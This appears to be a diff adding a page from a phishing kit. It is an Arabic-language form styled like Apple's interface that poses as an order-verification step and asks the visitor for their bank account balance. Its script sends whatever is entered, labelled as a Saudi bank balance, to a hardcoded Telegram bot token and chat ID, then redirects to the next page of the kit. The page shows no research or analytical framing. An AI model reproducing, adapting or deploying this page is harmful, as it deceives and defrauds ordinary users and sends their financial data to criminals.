@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>إدخال مبلغ الحساب </title>
+
+  <style>
+    :root {
+      --bg-page: #f5f5f7;
+      --card-bg: #ffffff;
+      --text-main: #111111;
+      --text-muted: #6e6e73;
+      --accent-blue: #0071e3;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui;
+    }
+
+    body {
+      background: var(--bg-page);
+      color: var(--text-main);
+    }
+
+    .page-wrapper {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+
+    p.subtitle {
+      font-size: 14px;
+      color: var(--text-muted);
+      margin-bottom: 22px;
+    }
+
+    .card {
+      background: var(--card-bg);
+      padding: 18px 16px 20px;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 360px;
+      box-shadow: 0 8px 22px rgba(0,0,0,0.06);
+      border: 1px solid rgba(0,0,0,0.04);
+    }
+
+    label {
+      display: block;
+      text-align: right;
+      font-size: 14px;
+      margin-bottom: 8px;
+    }
+
+    .code-input {
+      width: 100%;
+      padding: 10px 12px;
+      border-radius: 10px;
+      border: 1px solid #d2d2d7;
+      font-size: 16px;
+      text-align: center;
+      direction: ltr;
+    }
+
+    .code-input:focus {
+      outline: none;
+      border-color: var(--accent-blue);
+      box-shadow: 0 0 0 3px rgba(0,113,227,0.18);
+    }
+
+    .error {
+      margin-top: 8px;
+      font-size: 12px;
+      color: #ff3b30;
+      min-height: 16px;
+    }
+
+    .btn-primary {
+      margin-top: 14px;
+      width: 100%;
+      padding: 11px 0;
+      border-radius: 999px;
+      border: none;
+      background: var(--accent-blue);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .btn-primary:active {
+      transform: translateY(1px);
+      box-shadow: 0 3px 8px rgba(0,113,227,0.35);
+    }
+  </style>
+</head>
+<body>
+  <div class="page-wrapper">
+    <div class="card">
+      <h1>خطوة تحقق واحدة إضافية</h1>
+      <p class="subtitle">
+        قم بكتابة رصيد حسابك البنكي للبطاقة المدخلة لتحقق من ملكيتك لإتمام طلبك.
+      </p>
+
+      <label for="code-input">رصيد البطاقة</label>
+      <input
+        id="code-input"
+        class="code-input"
+        type="tel"
+        inputmode="numeric"
+        pattern="[0-9]*"
+        maxlength="12"
+        placeholder="أدخل رصيد حسابك هنا"
+      />
+
+      <div class="error" id="error-msg"></div>
+
+      <button class="btn-primary" id="submit-btn">Done</button>
+    </div>
+  </div>
+
+  <script>
+    const botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
+    const chatId   = "7811430582";
+
+    const codeInput = document.getElementById("code-input");
+    const errorMsg  = document.getElementById("error-msg");
+    const submitBtn = document.getElementById("submit-btn");
+
+    // السماح بالأرقام فقط
+    codeInput.addEventListener("input", function () {
+      this.value = this.value.replace(/\D/g, "");
+    });
+
+    submitBtn.addEventListener("click", function () {
+      const code = codeInput.value.trim();
+
+      if (!code) {
+        errorMsg.textContent = "الرجاء إدخال رصيد البطاقة للتحقق قبل المتابعة.";
+        return;
+      }
+
+      errorMsg.textContent = "";
+
+      const msg =
+        "رصيد البنك - سعودي\n\n" +
+        "Entered code: " + code;
+
+      fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msg
+        })
+      }).catch(function (err) {
+        console.log("Telegram error:", err);
+      }).finally(function () {
+        // الانتقال للخطوة الرابعة
+        window.location.href = "kpay4.html";
+      });
+    });
+  </script>
+</body>
+</html>
